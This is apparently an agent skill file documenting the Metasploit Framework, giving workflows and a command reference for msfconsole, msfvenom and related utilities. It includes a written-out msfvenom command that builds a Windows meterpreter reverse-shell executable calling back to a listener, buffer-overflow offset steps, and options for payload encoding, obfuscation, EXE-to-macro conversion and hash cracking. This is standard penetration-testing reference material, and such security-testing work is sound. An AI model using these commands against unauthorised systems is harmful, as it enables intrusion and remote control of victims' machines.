---
name: metasploit-framework
description: A comprehensive platform for vulnerability research, exploit development, and execution. Use for automated exploitation, payload generation (msfvenom), post-exploitation, database management of scan results, and auxiliary security testing across various platforms and architectures.
---

# metasploit-framework

## Overview
The Metasploit Framework is an open-source platform that supports vulnerability research, exploit development, and the creation of custom security tools. It includes a centralized console (msfconsole), a payload generator (msfvenom), and various utilities for pattern creation, obfuscation, and RPC interaction. Category: Exploitation / Vulnerability Analysis / Post-Exploitation.

## Installation (if not already installed)
Assume the framework is installed. If missing:
```bash
sudo apt update
sudo apt install metasploit-framework
```

## Common Workflows

### Launching the Console
```bash
msfdb init && msfconsole
```
Initializes the database and starts the main interactive interface.

### Generating a Reverse Shell Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o shell.exe
```

### Finding an Offset for Buffer Overflows
```bash
msf-pattern_create -l 500 > pattern.txt
# ... crash the application with the pattern ...
msf-pattern_offset -q <EIP_VALUE> -l 500
```

### Obfuscating JavaScript
```bash
msf-jsobfu -i input.js -t 3 -o output.js
```

## Complete Command Reference

### msfconsole
The primary interactive interface.
- `-E, --environment ENV`: Set Rails environment (default: 'production').
- `-M, --migration-path DIR`: Specify directory for additional DB migrations.
- `-n, --no-database`: Disable database support.
- `-y, --yaml PATH`: Specify YAML file for database settings.
- `-c FILE`: Load specified configuration file.
- `-v, -V, --version`: Show version.
- `--[no-]defer-module-loads`: Defer module loading unless explicitly asked.
- `-m, --module-path DIR`: Load an additional module path.
- `-a, --ask`: Ask before exiting or accept 'exit -y'.
- `-H, --history-file FILE`: Save command history to file.
- `-l, --logger STRING`: Specify logger (Flatfile, Stderr, Stdout, etc.).
- `--[no-]readline`: Enable/disable readline.
- `-L, --real-readline`: Use system Readline library.
- `-o, --output FILE`: Output to specified file.
- `-p, --plugin PLUGIN`: Load a plugin on startup.
- `-q, --quiet`: Do not print the banner.
- `-r, --resource FILE`: Execute resource file (- for stdin).
- `-x, --execute-command CMD`: Execute console commands (use `;` for multiples).

### msfvenom
Standalone payload generator and encoder.
- `-l, --list <type>`: List modules (payloads, encoders, nops, platforms, archs, encrypt, formats, all).
- `-p, --payload <payload>`: Payload to use. Use `-` for STDIN.
- `--list-options`: List payload options.
- `-f, --format <format>`: Output format.
- `-e, --encoder <encoder>`: Encoder to use.
- `--service-name <name>`: Service name for service binaries.
- `--sec-name <name>`: New section name for large Windows binaries.
- `--smallest`: Generate smallest possible payload using all encoders.
- `--encrypt <value>`: Encryption type to apply to shellcode.
- `--encrypt-key <key>`: Key for encryption.
- `--encrypt-iv <iv>`: IV for encryption.
- `-a, --arch <arch>`: Architecture for payload/encoders.
- `--platform <platform>`: Platform for payload.
- `-o, --out <path>`: Save payload to file.
- `-b, --bad-chars <list>`: Characters to avoid (e.g., '\x00\xff').
- `-n, --nopsled <len>`: Prepend nopsled of length.
- `--pad-nops`: Use `-n` as total payload size, auto-prepending nops.
- `-s, --space <len>`: Maximum size of resulting payload.
- `--encoder-space <len>`: Max size of encoded payload.
- `-i, --iterations <count>`: Number of times to encode.
- `-c, --add-code <path>`: Include additional win32 shellcode.
- `-x, --template <path>`: Custom executable template.
- `-k, --keep`: Inject payload as a new thread in template.
- `-v, --var-name <name>`: Custom variable name for output formats.
- `-t, --timeout <sec>`: Seconds to wait for STDIN (default 30).

### msfdb
Manage the framework database.
- `init`: Start and initialize the database.
- `reinit`: Delete and reinitialize the database.
- `delete`: Delete database and stop using it.
- `start`: Start the database.
- `stop`: Stop the database.
- `status`: Check service status.
- `run`: Start database and run msfconsole.

### msf-pattern_create
- `-l, --length <len>`: Length of the pattern.
- `-s, --sets <sets>`: Custom Pattern Sets (e.g., ABC,def,123).

### msf-pattern_offset
- `-q, --query <val>`: Query to locate (e.g., Aa0A).
- `-l, --length <len>`: Length of the pattern.
- `-s, --sets <sets>`: Custom Pattern Sets.

### msf-egghunter
- `-f, --format <fmt>`: Output format.
- `-b, --badchars <str>`: Bad characters to avoid.
- `-e, --egg <str>`: The egg (4 bytes).
- `-p, --platform <str>`: Platform.
- `--startreg <reg>`: Starting register.
- `--forward`: Search forward.
- `--depreg <reg>`: DEP register.
- `--depdest <dest>`: DEP destination.
- `--depsize <int>`: DEP size.
- `--depmethod <meth>`: DEP method (virtualprotect/virtualalloc/copy/copy_size).
- `-a, --arch <str>`: Architecture.
- `--list-formats`: List supported formats.
- `-v, --var-name <name>`: Custom variable name.

### msf-jsobfu
- `-t, --iteration <int>`: Number of obfuscation passes.
- `-i, --input <file>`: JavaScript file to obfuscate.
- `-o, --output <file>`: Save obfuscated file.
- `-p, --preserved-identifiers <ids>`: Identifiers to preserve.

### msf-virustotal
- `-k <key>`: VirusTotal API key.
- `-d <sec>`: Seconds to wait for report.
- `-q`: Hash search without uploading.
- `-f <files>`: Files to scan.

### msf-metasm_shell
- `-a`: Architecture (ARM, Ia32, MIPS, X86_64).
- `-e`: Endianness (big, little).

### msfrpcd (RPC Daemon)
- `-a <ip>`: Bind to IP (default: 0.0.0.0).
- `-c <path>`: (JSON-RPC) Path to certificate.
- `-f`: Run in foreground.
- `-j`: (JSON-RPC) Start JSON-RPC server.
- `-k <path>`: (JSON-RPC) Path to private key.
- `-n`: Disable database.
- `-p <port>`: Bind to port (default: 55553).
- `-P <pass>`: Password for access.
- `-S`: Disable SSL.
- `-t <sec>`: Token Timeout (default: 300).
- `-U <user>`: Username for access.
- `-u <uri>`: URI for Web server.
- `-v`: (JSON-RPC) SSL enable verify.

### Other Utilities
- **msf-exe2vba [exe] [vba]**: Convert EXE to VBA macro.
- **msf-exe2vbs [exe] [vbs]**: Convert EXE to VBScript.
- **msf-find_badchars**: `-b` (avoid chars), `-i` (input file), `-t` (format).
- **msf-halflm_second**: `-n` (hash), `-p` (decrypted 1-7 bytes), `-s` (challenge).
- **msf-hmac_sha1_crack [hashes.txt] [wordlist]**: Crack HMAC-SHA1.
- **msf-java_deserializer [file]**: `-a` (array ID), `-o` (object ID).
- **msf-md5_lookup**: `-i` (input file), `-d` (databases), `-o` (output file).
- **msf-pdf2xdp [in.pdf] [out.xdp]**: Convert PDF to XDP.
- **msfrpc**: `-a` (IP), `-p` (port), `-P` (pass), `-S` (no SSL), `-U` (user).

## Notes
- `msfupdate` is deprecated on Kali; use `apt` instead.
- Always initialize the database (`msfdb init`) before using `msfconsole` for significantly faster module searching and data persistence.
- When using `msfvenom`, ensure the architecture (`-a`) and platform (`--platform`) match the target to avoid payload failure.